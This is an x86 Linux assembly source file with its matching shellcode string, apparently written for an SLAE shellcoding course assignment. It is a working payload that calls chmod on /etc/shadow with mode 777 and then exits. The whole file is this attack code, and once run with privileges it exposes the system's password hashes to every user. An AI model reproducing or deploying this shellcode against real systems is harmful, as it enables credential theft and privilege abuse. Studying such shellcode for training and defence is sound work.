;; SLAE Assignment #6: original shellcode chmod 777 shadow
;; Website:  http://blog.jsiob.com
;; SLAE-ID: 1400
;; Shellcode: "\x31\xc0\x50\xb0\x0f\x68\x61\x64\x6f\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x89\xe3\x31\xc9\x66\xb9\xff\x01\xcd\x80\x40\xcd\x80"

global _start			

section .text
_start:

	xor eax,eax
	push eax
	mov al,0xf
	push dword 0x776f6461
	push dword 0x68732f63
	push dword 0x74652f2f
	mov ebx,esp
	xor ecx,ecx
	mov cx,0x1ff
	int 0x80
	inc eax
	int 0x80
